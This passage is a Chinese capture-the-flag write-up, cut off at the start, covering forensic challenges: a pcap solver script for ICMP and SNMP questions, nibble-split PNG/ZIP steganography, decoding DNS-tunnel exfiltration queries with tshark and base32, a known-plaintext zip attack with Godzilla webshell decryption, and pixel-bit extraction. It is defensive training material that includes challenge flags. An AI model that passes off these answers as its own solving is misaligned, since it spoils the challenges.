                flags['Q6'] = f"flag{{0x{icmp_seq:04x}}}"
                print(f"\n✅ Q6答案: {flags['Q6']}")
                break

    # ========================================================================
    # Q7: SNMP Get请求的OID
    # ========================================================================
    print("\n" + "=" * 80)
    print("Q7: SNMP Get请求的OID")
    print("=" * 80)

    scada_ip = "192.168.1.5"
    
    for pkt in pkts:
        if UDP in pkt and IP in pkt:
            if pkt[UDP].dport == 161:  # SNMP port
                # 只查找从SCADA到控制站的SNMP请求
                if pkt[IP].src == scada_ip and pkt[IP].dst == ctrlws_ip:
                    if Raw in pkt:
                        payload = bytes(pkt[Raw].load)
                        if b'SNMP' in payload or b'GetRequest' in payload or b'OID=' in payload:
                            try:
                                text = payload.decode('utf-8', errors='ignore')
                                if 'OID=' in text:
                                    start = text.find('OID=')
                                    # 查找OID的结束位置
                                    end = len(text)
                                    for i in range(start + 4, len(text)):
                                        if text[i] == ';' or text[i] == '\n' or text[i] == '\r':
                                            end = i
                                            break
                                    
                                    if end > start:
                                        oid = text[start + 4:end].strip()
                                        print(f"找到SNMP Get请求:")
                                        print(f"  源IP: {pkt[IP].src}")
                                        print(f"  目的IP: {pkt[IP].dst}")
                                        print(f"  完整内容片段: {text[:200]}")
                                        print(f"  OID: {oid}")

                                        flags['Q7'] = f"flag{{{oid}}}"
                                        print(f"\n✅ Q7答案: {flags['Q7']}")
                                        break
                            except Exception as e:
                                pass

    # ========================================================================
    # 输出所有答案
    # ========================================================================
    print("\n" + "=" * 80)
    print("所有Flag汇总")
    print("=" * 80)

    for i in range(1, 8):
        key = f'Q{i}'
        if key in flags:
            print(f"{key}: {flags[key]}")
        else:
            print(f"{key}: 未找到")

    print("\n" + "=" * 80)
    print("解题完成！")
    print("=" * 80)


if __name__ == "__main__":
    solve_all_flags("123.pcap")
```

---

### 总裁四比特,这能玩？

解压查看图片的尾部有数据

提取文件分析

文件尾部的数据显示是png   但是文件头对不上

原png的文件头是89504E47  这里显示的是59004EB7

高位提取显示是 504B0304  也就是zip的文件头数据

低位是png的数据

把原本每个字节里的“高位”拿出来，拼凑新文件

```

with open('1.bin', 'rb') as f:
    data = f.read()

# 提取每个字节的高 4 位，并每两个组合成一个新字节
# 如 0x59 0x00 -> 0x50 ('P')
extracted = bytes((data[i] & 0xF0) | (data[i+1] >> 4) for i in range(0, len(data), 2))

with open('12.bin', 'wb') as f:
    f.write(extracted)

print("提取完成。")



提取出新的zip文件
```

修改文件的后缀.zip

再次查看文件尾部的数据得到zip

解压得到flag













---

### Silent Resolver

DNS隧道问题

`tshark -r traffic.pcapng -T fields -e dns.qry.name | sort -u`能看见很多异常DNS记录

```
0000.kbfqgbauaaaaacaajbsskxfwamzbcoaaaaadmaaaaaeaaaaamz.a1b2c3d4.exfil.unictf.local
0001.wgczzoor4hic6nzn2a44nloyy4qk4jb4utekjorf37cc4ob4wd.a1b2c3d4.exfil.unictf.local
0002.klrsjqwy4n6pgcxiz5zvjthsrcpxgbgdddqpgzhc4mrofgxaka.a1b2c3d4.exfil.unictf.local
0003.cqjmaqefadcqaaaaaiabegkjk4wybteejyaaaaanqaaaaaqaaa.a1b2c3d4.exfil.unictf.local
0004.aaaaaaaaaaaaaaeaaeaaaaaamzwgczzoor4hiuclaudaaaaaaa.a1b2c3d4.exfil.unictf.local
0005.aqaaiagyaaaac6aaaaaaaa.a1b2c3d4.exfil.unictf.local
ffff.1818be0b.a1b2c3d4.exfil.unictf.local
```

直接提取exfil域名的数据部分

```
tshark -r traffic.pcapng -T fields -e dns.qry.name | grep "exfil.unictf.local" | sort -u | cut -d'.' -f2
```

这里有一个小常识，拿到的base32编码为小写（域名只能是小写），需要转换为大写才行（如果你用cyberchef转的话）

这里在大厨里用To Upper case转成大写，然后base32解码，最后unzip解压得到flag

---

### BlueBreath

题目描述：巨兽并不会凭空消失，它只是换了一种频率在呼吸

 考点 图片隐写 明文攻击 哥斯拉

 UniCTF{w1reSha3k_easy_or_hard}

流量包里面找到上传的hint文件

从流量包里面提取了一个hint.zip   查看加密的方式 然后使用明文攻击爆破文件头

然后在爆破出来的图片里面颜色通道高位找到Ahiz_2026

查看后面显示上传webshell

使用Ahiz_2026加密MD5

然后取前面16位作为密钥解密webshell

```
解密
from hex

用密钥xor

得到flag
```

---

### 截取的线索

```Plain
两个文件  首先是7
数据异或处理 得到一半flag
UniCTF{P1ckle_the
UniCTF{P1ckle_the_Great_to01}
```

用7异或第一个文件的数据得到第一段flag

然后还有另一张图片，打开发现只有黑白，一长条。

用脚本得到01数据

```
from PIL import Image
import sys

def extract_bits(img_path, black_is_one=True):
    """从黑白像素图中提取数据"""
    # 1. 打开并灰度化
    img = Image.open(img_path).convert('L')
    pixels = list(img.getdata())
    
    # 2. 自动计算阈值（取最小最大值的中点）
    threshold = (min(pixels) + max(pixels)) // 2
    
    # 3. 像素→二进制串（True:黑=1, False:黑=0）
    bin_str = ''.join(
        '1' if (p <= threshold) == black_is_one else '0'
        for p in pixels
    )
    
    # 4. 二进制串→字节
    padding = (8 - len(bin_str) % 8) % 8
    bin_str += '0' * padding
    
    return bytes(int(bin_str[i:i+8], 2) for i in range(0, len(bin_str), 8))

# 使用示例
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("用法: python extract.py <图片路径>")
        sys.exit(1)
    
    # 尝试两种映射（黑=1/黑=0）
    for mapping in [True, False]:
        data = extract_bits(sys.argv[1], black_is_one=mapping)
        print(f"\n{'黑=1,白=0' if mapping else '白=1,黑=0'}")
        print(f"前32字节: {data[:32].hex()}")
        print(f"ASCII预览: {data[:50].decode('ascii', errors='ignore')}")
        
        # 检查flag
        if b'flag' in data.lower():
            print(f"✅ 发现flag!")
            print(data[data.lower().find(b'flag'):data.lower().find(b'flag')+50])
            break
```

然后01数据转成字符得到后半段flag













